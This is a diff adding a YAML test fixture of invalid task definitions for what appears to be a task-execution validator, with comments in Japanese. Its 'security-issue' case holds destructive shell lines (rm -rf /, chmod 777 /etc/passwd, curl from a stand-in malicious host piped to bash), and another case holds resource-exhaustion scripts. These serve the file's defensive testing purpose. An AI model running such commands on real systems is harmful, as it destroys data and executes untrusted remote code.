@@ -1,0 +1,178 @@
+# Error Cases Sample
+# エラーケース（無効なYAML、欠損フィールドなど）のテストケース
+
+# ケース1: 必須フィールド欠損
+- id: "missing-required-fields"
+  # title フィールドが欠損
+  description: "必須のtitleフィールドが欠損している無効なタスク"
+  type: "machine"
+  # status フィールドも欠損
+
+# ケース2: 無効なタスクタイプ
+- id: "invalid-task-type"
+  title: "無効なタスクタイプ"
+  description: "サポートされていないタスクタイプを指定"
+  type: "invalid_type"  # machine, human, ai 以外は無効
+  status: "todo"
+
+# ケース3: 循環依存
+- id: "circular-dependency-a"
+  title: "循環依存A"
+  description: "循環依存を作るタスクA"
+  type: "machine"
+  status: "todo"
+  dependencies:
+    - id: "circular-dependency-b"
+      type: "strict"
+  execution:
+    script: "echo 'Task A'"
+
+- id: "circular-dependency-b"
+  title: "循環依存B"
+  description: "循環依存を作るタスクB"
+  type: "machine"
+  status: "todo"
+  dependencies:
+    - id: "circular-dependency-a"  # Aに依存してしまい循環になる
+      type: "strict"
+  execution:
+    script: "echo 'Task B'"
+
+# ケース4: 存在しない依存関係
+- id: "non-existent-dependency"
+  title: "存在しない依存関係"
+  description: "存在しないタスクIDに依存している"
+  type: "machine"
+  status: "todo"
+  dependencies:
+    - id: "this-task-does-not-exist"
+      type: "strict"
+  execution:
+    script: "echo 'This will never run'"
+
+# ケース5: 無効な実行スクリプト
+- id: "invalid-execution-script"
+  title: "無効な実行スクリプト"
+  description: "実行に失敗するスクリプトを含む"
+  type: "machine"
+  status: "todo"
+  execution:
+    script: |
+      #!/bin/bash
+      # 存在しないコマンドを実行
+      this_command_does_not_exist
+      # 未定義変数を参照
+      echo $UNDEFINED_VARIABLE
+      # 存在しないファイルを読み取り
+      cat /this/file/does/not/exist
+
+# ケース6: 無効なYAML構文
+
+id: "invalid-yaml-syntax"
+title: "無効なYAML構文"
+description: "YAML構文エラーを含む（intentionally malformed for testing）"
+type: "machine"
+status: "todo"
+execution:
+  script: |
+    echo "This YAML demonstrates syntax errors"
+# Note: この下のフィールドは意図的に不正なインデントです（テスト用）
+# invalid_field:
+#   bad_indentation: "value"
+#     also_bad: "another value"
+
+# ケース7: 型の不一致
+# ケース8: 型の不一致を含むタスク
+
+id: 12345  # 数値（文字列であるべき）
+title: ["配列", "タイトル"]  # 配列（文字列であるべき）
+description: 123  # 数値（文字列であるべき）
+type: "machine"
+status: true  # 真偽値（文字列であるべき）
+dependencies: "single-string"  # 文字列（配列であるべき）
+
+# ケース9: 無効なバリデーション設定
+
+id: "invalid-validation"
+title: "無効なバリデーション設定"
+description: "不正なバリデーション設定を含む"
+type: "machine"
+status: "todo"
+execution:
+  script: "echo 'test'"
+validation:
+  output_files: "not-an-array"  # 配列であるべき
+  expected_content:
+    - file: 123  # 数値（文字列であるべき）
+      contains: ["配列", "不正"]  # 配列（文字列であるべき）
+
+# ケース10: セキュリティ問題のあるスクリプト
+
+id: "security-issue"
+title: "セキュリティ問題のあるスクリプト"
+description: "潜在的にセキュリティ問題のあるスクリプト"
+type: "machine"
+status: "todo"
+execution:
+  script: |
+    #!/bin/bash
+    # 危険な操作の例
+    rm -rf / 2>/dev/null || true
+    chmod 777 /etc/passwd
+    curl -s http://malicious-site.com/script.sh | bash
+    echo "password123" > /tmp/secrets.txt
+
+# ケース11: リソース制限違反
+
+id: "resource-violation"
+title: "リソース制限違反"
+description: "リソース制限を超える処理"
+type: "machine"
+status: "todo"
+execution:
+  script: |
+    #!/bin/bash
+    # 無限ループ（CPU制限違反）
+    while true; do
+      echo "Infinite loop"
+    done &
+
+    # 大量メモリ消費
+    dd if=/dev/zero of=/tmp/huge_file bs=1G count=100
+
+    # 大量ファイル作成
+    for i in {1..1000000}; do
+      touch "/tmp/file_$i"
+    done
+
+# ケース12: 文字エンコーディング問題
+
+id: "encoding-issue"
+title: "文字エンコーディング問題"
+description: "不正な文字エンコーディングを含む"
+type: "machine"
+status: "todo"
+execution:
+  script: |
+    echo "無効な文字: \\xFF\\xFE"
+    echo "制御文字: \\x00\\x01\\x02"
+
+# ケース13: 深すぎるネスト構造
+
+id: "deep-nesting"
+title: "深すぎるネスト構造"
+description: "処理困難な深いネスト構造"
+type: "machine"
+status: "todo"
+deeply:
+  nested:
+    structure:
+      that:
+        goes:
+          very:
+            very:
+              very:
+                deep:
+                  and:
+                    might:
+                      cause: "performance issues in parsing or processing"
